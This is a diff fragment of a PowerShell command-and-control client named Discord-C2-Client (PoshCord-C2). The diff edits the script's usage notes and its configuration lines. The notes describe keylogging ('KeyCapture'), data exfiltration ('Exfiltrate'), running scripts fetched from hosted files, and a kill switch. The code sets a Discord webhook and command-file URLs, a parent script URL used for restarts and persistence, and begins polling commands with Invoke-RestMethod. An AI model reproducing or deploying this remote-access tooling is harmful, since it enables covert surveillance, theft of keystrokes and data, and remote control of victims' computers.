@@ -34,17 +34,18 @@ MODULES
 = CustomCommand : Execute a github file as a script.   
 
 EXTRA
-You can add custom scripting in a secondary hosted file, change YOUR_OTHER_GITHUB_FILE_URL to another text file and add code to it,
+You can add custom scripting in a secondary hosted file, change YOUR_SECONDARY_FILE_URL to another text file and add code to it,
 then in the original hosted file save it with 'customcommand' as the contents 
 
 Killswitch
-Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
+Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.
 #>
 
-# Uncomment the lines below and add you details
-# $GHurl = "YOUR FILE URL" 
-# $CCurl = "YOUR SECONDARY GITHUB FILE URL"  # (optional)
+# Uncomment the lines below and add your details
 # $hookurl = "YOUR WEBHOOK URL"
+# $GHurl = "YOUR FILE URL" 
+
+# $CCurl = "YOUR SECONDARY FILE URL"  # (optional)
 
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
